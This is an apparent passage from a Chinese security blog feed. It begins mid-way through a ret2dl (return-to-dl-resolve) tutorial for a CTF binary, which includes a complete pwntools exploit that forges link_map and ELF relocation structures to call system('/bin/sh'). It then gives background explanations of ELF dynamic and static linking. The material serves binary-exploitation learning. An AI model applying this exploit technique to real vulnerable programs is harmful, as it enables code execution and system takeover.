class="code"><pre><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_name任意设置</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#保证st_info, st_other, st_shndx st_other非零r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   已经解析的函数got地址减去8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_size随意设置</span></span><br></pre></td></tr></table></figure><p>接下来就该伪造link_map本身了，我们会发现伪造link_map中有好多地方是空的，我们不妨利用起来，将什么三个表项也放入link_map结构中,顺便把后面要用到的’/bin/sh\x00’也写入。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  任意可读位置即可</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  指向fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  指向fake_relplt_Elf64_Dyn</span></span><br></pre></td></tr></table></figure><p>接下来只需将binsh的地址放入寄存器中再调用jmp_dl_fixup到我们构造好的link_map即可</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#先调用read将数据写入.bss段</span></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#返回到pop rbp; retn，劫持栈。</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">system_write_offset=libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;write&#x27;</span>]    <span class="comment">#后面伪造link_map时l_addr的值</span></span><br><span class="line">success(<span class="string">&#x27;system_write_offset :&#x27;</span>+<span class="built_in">hex</span>(system_write_offset))</span><br><span class="line">fake_relplt_Elf64_Dyn_addr=fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line">fake_Elf64_Sym_addr=fake_link_map_addr+<span class="number">0x30</span></span><br><span class="line">fake_Elf64_Rela_addr=fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line">binsh_addr=fake_link_map_addr+<span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  标签，用不到可以随意设置</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  指向虚假的Elf64_Rela结构体的指针。因为reloc_offset被简化为0，所以该地址就是我们伪造的地址</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,这里让其写入一个可写地址即可，这里选择fake_link_map，因为我们的l-&gt;addr为system_write_offset那么r_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     index设置为0，最后一字节必须为7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   任意设置即可</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_name任意设置</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#保证st_info, st_other, st_shndx st_other非零r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   已经解析的函数got地址减去8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_size随意设置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  任意可读位置即可</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  指向fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  指向fake_relplt_Elf64_Dyn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(jmp_dl_fixup)</span><br><span class="line">payload+=p64(fake_link_map_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">payload+=fake_link_map</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>除去比赛花了两周时间终于把ret2dl总结完了，参考了网络上好多师傅的博客和资料，学到了好多，真心希望这篇博客也能帮助看见它的你。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-动态链接</title>
      <link href="/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写这篇博客的时候没有学习静态链接就去补了补知识，索性把这篇博客也改为基础知识，后面再写具体的攻击方法。看这篇前可以先了解一下静态链接。</p><h1 id="一些重要的section"><a href="#一些重要的section" class="headerlink" title="一些重要的section"></a>一些重要的section</h1><h2 id="“-interp”"><a href="#“-interp”" class="headerlink" title="“.interp”"></a>“.interp”</h2><p>当我们的系统将可执行文件装载之后，其中好多地址还处于无效状态，此时需要<strong>动态链接器</strong>通过映射的方法加载到进程的地址空间中。操作系统加载完动态链接器后，将控制权交给动态链接器的入口地址。动态链接器获取控制器，执行自身初始化工作，然后根据环境参数对可执行文件进行动态链接工作。当动态链接工作完成后将控制权交由可执行文件入口，程序开始正式执行。</p><p>而动态链接器的位置由谁来决定那？实际上是由ELF文件自己决定的，而决定这一切的section叫做<em><strong>.interp</strong></em>。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210726111522241.png" alt="’.interp‘"></p><p>上图就是某个文件的’.interp’段，大多数情况下动态链接器都位于/lib里，但是这里我用patchelf更改过了，也说明这里是可以更改的，由ELF文件自己决定的。</p><p>这个段的内容很简单，里面就保存了上面这样的字符串，而这个字符串就是动态链接器的路径。</p><h2 id="“-dynamic”"><a href="#“-dynamic”" class="headerlink" title="“.dynamic”"></a>“.dynamic”</h2><p>动态链接最为重要的结构就是<em><strong>.dynamic</strong></em>，这个段保存了动态链接库需要的最基本的信息，比如依赖于哪些共享对象、动态连接符号表的位置、动态链接重定位表位置、共享对象初始化代码的地址等。书上写这个section有点类似于ELF的文件头，确实，其形式更像是ELF Header，而我觉得这个部分功能上更接近SHT，有着和SHT相似的功能，都是帮助我们寻找到section的，或许可以说是二者的结合。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727162459172.png" alt="&#39;.dynamic&#39;"></p><p>其结构体为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>NEEDED</td><td>依赖的共享对象文件</td></tr><tr><td>INIT</td><td>初始化代码地址，也就是.init的位置</td></tr><tr><td>FINT</td><td>是结束代码地址，也就是.fini的位置</td></tr><tr><td>GUN_HASH</td><td>动态链接哈希表地址</td></tr><tr><td>STRTAB</td><td>动态链接字符串表的位置，表示.dynstr的位置</td></tr><tr><td>SYMTAB</td><td>动态链接符号表的位置,表示.dynsym的位置;</td></tr><tr><td>PLTGOT</td><td>指向.got的位置</td></tr><tr><td>JMPREL</td><td>表示重定位表，也就是.rel.plt</td></tr><tr><td>REL\RELA</td><td>表示动态链接重定位表的位置;RELENT/RELAENT表示动态重读位表入口数量</td></tr></tbody></table><p>在静态链接中我们是通过</p><h2 id="“-dynsym”-”-dynstr”-amp-”-hash”"><a href="#“-dynsym”-”-dynstr”-amp-”-hash”" class="headerlink" title="“.dynsym”,”.dynstr”&amp;”.hash”"></a>“.dynsym”,”.dynstr”&amp;”.hash”</h2><p>在静态链接中有一个专门的段叫做<em><strong>.symtab</strong></em>,里面保存了所有关于该目标的符号的定义和引用.而为了表示动态链接模块间的符号导入导出关系,ELF专门有一个叫做<strong>动态链接符号表</strong>的段用来保存这些信息,也就是<em><strong>.dynsym</strong></em>.</p><p>重要的是”.dynsym”只保存了动态链接相关的符号,而模块内私有的变量则不会保存，这一点和静态链接中符号表是相似的.通常动态链接的模块同时包含:”.symtab”和”。”.dynsm“这两个段。”.symtab”包含所有的符号,也包括”.dynsym”中的符号.</p><p>“.strtab”,一个用于保存符号名的字符串表.而”.cybsym”对应的就是动态符号字符串表</p><p><em><strong>.dynstr</strong></em>.用于动态链接中我们需要在程序运行的时候查找符号,为了加快符号的查找过程,往往通过<strong>符号哈希表</strong>—<em><strong>.hash</strong></em>来加快符号查找速度，这个是动态链接独有的.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170027080.png" alt="&#39;.dynsym&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170510147.png" alt="&#39;.hash&#39;"></p><h2 id="“-rel-dyn”-amp-”-rel-plt”"><a href="#“-rel-dyn”-amp-”-rel-plt”" class="headerlink" title="“.rel.dyn”&amp;”.rel.plt”"></a>“.rel.dyn”&amp;”.rel.plt”</h2><p>静态链接中有<em><strong>.rel.text</strong></em>(代码段重定位表)和<em><strong>.rel.data</strong></em>(数据段重定位表)作为静态链接中用于表示重定位信息的重定位表.</p><p>在动态链接中自然也有与之对应的重定位表<em><strong>.rel.dyn</strong></em>,<em><strong>.rel,plt</strong></em>.”rel.dtn”实际上是对数据引用的修正,它所修正的位置位于”.got”以及数据段;而”.rel.plt”是对函数引用的修正,它所修正的位置位于”.got.plt”.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180200847.png" alt="&#39;.rel.fyn&#39;&amp;&#39;.rel.plt&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180447657.png" alt="SHT"></p><h1 id="动态链接和静态链接不同以及解决方法"><a href="#动态链接和静态链接不同以及解决方法" class="headerlink" title="动态链接和静态链接不同以及解决方法"></a>动态链接和静态链接不同以及解决方法</h1><p>动态链接和静态链接相同需要解决符号解析和重定位的问题，这部分和静态链接是差不多的，只有其指令修正方式会有所不同。最大的问题在于：<strong>由于其共享库数量不能确定，我们不可能进行Segement 合并</strong>，当加载多个共享库时，所有的共享库都需要驻留在Mmap中，独自占有一块空间。因此共享库需要支持任意地址被加载，共享库的起始位置只有当运行的时候才会被确定。</p><h2 id="位置无关代码-PIC"><a href="#位置无关代码-PIC" class="headerlink" title="位置无关代码(PIC)"></a>位置无关代码(PIC)</h2><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>为了可以解决动态链接中出现的这些问题，这里采取PIC技术。PIC的实现依赖于一个事实：EOF文件的Segment是按照它们在磁盘文件中的结构被复制到运行内存的。这一点可能对于我们来说司空见惯了，EOF文件中任何一个付号对于文件的偏移在加载到内存后都是固定的。然而这是实现PIC的关键所在，因为这样的话，<strong>任何两个符号之间的偏移就会变成一个固定的值</strong>。</p><p>PIC通过<strong>全局偏移表</strong>也就是我们经常劫持的GOT表来实现，GOT被储存在.data段中，正如我们上面所说的其关于.text的偏移是固定的。当GOT表在磁盘上的时候其值是为空的，只有当EOF文件被加载到内存后，才有可能让动态链接器根据重定位表和符号表找到符号的绝对地址，将其写入got表。</p><h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><p>GOT解决了共享库的全局变量引用，但是我们还要处理函数调用。这里就需要<strong>函数链接表</strong>：PLT表。</p><p>因为我们不可以修改.text段，所以我们需要采用GOT加PLT的方法，PLT表跳转的位置指向GOT表储存的地址。</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>ELF下的<strong>延迟绑定</strong>过程——<em><strong>PLT</strong></em>，在ELF文件中当我们调用函数都是通过一个叫做PLT项的结构来进行跳转的，假设我们有一个bar()函数，其在PLT中的地址我们称为bar@PLT。那么其实现为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>bar@plt的第一条通过GOT间接跳转指令，假设我们已经进行过延迟绑定，此时bar@GOT里存放这我们真正的bar函数对应的项，那么这个跳转指令自然会跳转到我们想要的地方。但是，如果还没有进行过延迟绑定那，那么此时这里存放的必定不是我们想要的地址，<strong>此时bar@GOT存放的其实是bar@plt的第二条指令</strong>，第二条指令是将一个数字n压入栈里，而这个数字是<strong>bar这个符号引用在重定位表”.rel.plt”的下标</strong>。接下来又一个push将指令模块的ID压入栈中，最后再跳转到**_dl_runtime_resolve**。</p><p>当bar()这个函数被解析过一次，那么下次调用就不用再次重定位，只需要直接跳转到bar()函数中。ELF将GOT拆为两个表”.got”和 “.got.plt”，其中”.got”来报存全局变量引用地址，”.got.plt”保存函数引用地址。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>以上基本阐述了动态链接的过程，接下来就是**_dl_runtime_resolve**这个函数的问题了。这个留在ret2dl再讨论吧</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与ret2dl有关的前置知识-link</title>
      <link href="/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/"/>
      <url>/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们rop里有一种高级的攻击方法ret2dl，它和动态链接有关，在我去学习ret2dl时发现自己对ELF文件中的一些section不是那么熟悉，而且不了解静态链接是怎么完成的，对动态链接的过程有些不知所措，这里总结一下最近学习的静态链接以及其相关section对ret2dl做一些补充说明。我这里只表述我认为的静态链接最为关键的部分，如果对其他方面有兴趣可以在参考部分寻找需要的资料。</p><h1 id="ELF结构"><a href="#ELF结构" class="headerlink" title="ELF结构"></a>ELF结构</h1><p>ELF文件最前方的是<strong>ELF文件头</strong> (<strong>ELF Header</strong>)，包含着文件的基本信息，接下来就是ELF文件的各种段。在这些不同的段中最为重要的就是<strong>段表</strong>(<strong>section Header Table</strong>)，也就是<em><strong>SHT</strong></em>，这个段表述了ELF文件中包含的所有段信息。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809165314132.png" alt="ELF结构"></p><p>我们先看看链接器是如何分析一个ELF文件的</p><h1 id="静态链接的重要section，以及链接器的分析"><a href="#静态链接的重要section，以及链接器的分析" class="headerlink" title="静态链接的重要section，以及链接器的分析"></a>静态链接的重要section，以及链接器的分析</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -h &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看一个ELF文件的文件头，这里不妨查看libc的ELF Header</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809170056849.png" alt="ELF Header"></p><p>通过上图可以看到ELF文件里定义了很多东西，包括魔数、文件机器字节长度、储存方式等信息，而这里对我们静态链接过程中最为重要的就是<strong>Start of section headers</strong>，这里是我们段表在文件中的偏移，通过上图我们知道段表在文件的第1864377字节开始。而链接器也会通过该项找到我们SHT的位置。</p><h2 id="Section-Header-Table-SHT"><a href="#Section-Header-Table-SHT" class="headerlink" title="Section Header Table(SHT)"></a>Section Header Table(SHT)</h2><p>我们的ELF文件中有各种各样的不同段，而段表就是记录这些段的基本，通过上面查看的ELF Header可以得到段表的起始位置为1864377 Bytes，每个表项大小是64 Bytes，一共是72项</p><p>我们可以通过</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -S &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>这样的命令来查看每个段的具体信息</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809175848346.png" alt="SHT"></p><p>SHT每项包含</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>Section name：这里存放的是其name字符在字符串表的偏移</td></tr><tr><td>sh_type</td><td>Section type：表示该段的类型，例如.text是程序段</td></tr><tr><td>sh_flag</td><td>Section flag：表示该段的标志位</td></tr><tr><td>sh_addr</td><td>Section Address：段虚拟地址</td></tr><tr><td>sh_offset</td><td>Section Offset：段偏移 表示该段在文件中的偏移</td></tr><tr><td>sh_size</td><td>Section Size：该段长度</td></tr><tr><td>sh_link</td><td>Section Link：链接有关段专属,段链接信息</td></tr><tr><td>sh_info</td><td>Section information：同上</td></tr><tr><td>sh_addralign</td><td>Section Address Alignment：段地址对齐方式</td></tr><tr><td>sh_entsize</td><td>Section Entry Size：如果该段有一些固定大小项，这里展示每项的大小</td></tr></tbody></table><p>有了这个SHT我们就可以找到任何一个想要找到的section在哪里了。这里链接器就可以知道所有段的位置和长度。而仅仅找到每个段的位置是不足以让来链接器完成链接的工作的，我们不能单单是把相似的section合并了事。</p><p>在runtime阶段，我们要调用一个变量或者函数是需要知道该函数或者是变量的位置的，这里就需要</p><p>对符号进行分析。这里也需要一个表来寻找不同的符号，去对符号进行解析。</p><h2 id="symbol-Table"><a href="#symbol-Table" class="headerlink" title="symbol Table"></a>symbol Table</h2><p>如果我们要定位到每个符号在ELF中的位置，这就需要一个section来表述这些符号，也就是<strong>.symtab</strong>(<strong>符号表</strong>)。我们知道C语言不难在函数的内部再次定义函数，所以一个ELF文件平分为两层：函数的内部、函数外部。<strong>外部的</strong>函数和变量是对链接可见的，所以它们可以被其他的ELF文件所引用，也就是符号。</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>st_name 保存了指向符号表中字符串表（位于.dynstr 或者.strtab） 的偏移地址，偏移地址存放着符号的名称，如 printf。</td></tr><tr><td>st_value</td><td>st_value 存放符号的值（可能是地址或者位置偏移量）。</td></tr><tr><td>st_size</td><td>st_size 存放了一个符号的大小，如全局函数指针的大小，在一个 32 位 系统中通常是 4 字节。</td></tr><tr><td>st_other</td><td>st_other 变量定义了符号的可见性。</td></tr><tr><td>st_shndx</td><td>每个符号表条目的定义都与某些节对应。st_shndx 变量保存了相关节头表的索引。</td></tr><tr><td>st_info</td><td>st_info 指定符号类型及绑定属性。</td></tr></tbody></table><h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>st_info分为两个部分<strong>Symbol Type</strong>和<strong>Symbol Binding</strong>。</p><p><em><strong>Bind：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>本地符号在目标文件之外是不可见的，目标文件包含 了符号的定义，如一个声明为 static 的函数。</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>全局符号对于所有要合并的目标文件来说都是可见 的。一个全局符号在一个文件中进行定义后，另外一个文件可以对这 个符号进行引用。</td></tr><tr><td>STB_WEAK</td><td>2</td><td>与全局绑定类似，不过比 STB_GLOBAL 的优先级低。 被标记为 STB_WEAK 的符号有可能会被同名的未被标记为 STB_WEAK 的符号覆盖。</td></tr></tbody></table><p><em><strong>Type：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE</td><td>0</td><td>符号类型未定义。</td></tr><tr><td>STT_OBJECT</td><td>1</td><td>该符号是一个数据对象，比如变量、数组等</td></tr><tr><td>STT_FUNC</td><td>2</td><td>表示该符号与函数或者其他可执行代码关联。</td></tr><tr><td>STT_SECTION</td><td>3</td><td>该符号表示一个段，这种符号必须是STB_LOCAL的</td></tr><tr><td>STT_FILE</td><td>4</td><td>该符号表示文件名，一般是该目标文件对应的源文件名，它一定是STB_LOCAL类型的，并且它的st_shndx一定是SHN_ABS</td></tr></tbody></table><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>0xfff1</td><td>表示该符号包含一个绝对的值，比如文件名的符号</td></tr><tr><td>SHN_COMMON</td><td>0xfff2</td><td>表示该符号是一个“common块”类型的符号，一般未初始化的全局符号就是这种类型的。</td></tr><tr><td>SHN_UNDEF</td><td>0</td><td>表示该符号未定义。这个符号表示该服符号在目标文件被引用，但定义在其他目标文件中</td></tr></tbody></table><p>以上就是除了重定位段以外关于静态链接的的核心section。重定位我们在后面讨论静态链接的过程中再讨论。</p><h1 id="静态链接过程"><a href="#静态链接过程" class="headerlink" title="静态链接过程"></a>静态链接过程</h1><h2 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h2><p> 静态链接的第一步需要符号解析，在ELF文件被读入内存后，不同的文件可能有相同的符号名。符号解析需要解决这种冲突，需要在所有的ELF中选择一个作为该符号的定义，当然对于局部符号而言是不需要考虑不同文件件的冲突问题的。</p><p>对于全局符号而言其有四种状态</p><table><thead><tr><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>Defined(有定义)</td><td>该符号在ELF文件中有确切的位置来储存其数值</td></tr><tr><td>Tentative(临时定义)</td><td>该符号没有确定的储存空间，也就是在SHN_COMMON中的全局变量，在编译阶段无法确定其最最终归属</td></tr><tr><td>Undefined(未定义)</td><td>该符号没有储存空间，也就是其属于SHN_UNDEF段</td></tr><tr><td>Weak Bind(弱定义)</td><td>该符号属于弱定义，也就是其bind为STB_WEAK</td></tr></tbody></table><p>这些符号的优先级为<strong>Undefined &lt; Weak Bind &lt; Tentative &lt; Defined</strong></p><p>全局符号只能存在一个，当出现重复的全局符号时只能选择一个作为目标文件的符号，这里的四种符号，<strong>强符号只有Defined</strong>这一种，其余三项都是弱符号</p><p>而选择符号有以下条规则：</p><ul><li>当存在强符号，且只有这一个强符号时，选择该强符号</li><li>当同时存在多个强符号时，链接器无法处理，报错</li><li>当没有强符号存在时，按照优先级选择一个弱符号</li></ul><p>大多数情况下可以通过这个规则选择出需要的符号，但若在最后一种情况下出现type和size的区分有时候链接器也会无法做出决定。</p><p>经过这一步链接器就将不同的ELF文件中的符号全部处理完成了</p><h2 id="Section-merge"><a href="#Section-merge" class="headerlink" title="Section merge"></a>Section merge</h2><p>当我们的符号解析完成后，接下来就是对相同类型的section进行合并。通过被解析的符号，将相同section的符号放在同一section，这样我们就确定了每个符号在EOF文件中的大小和起始位置，建立起一个映射关系。合并起来的section被称作Segment。</p><p><img 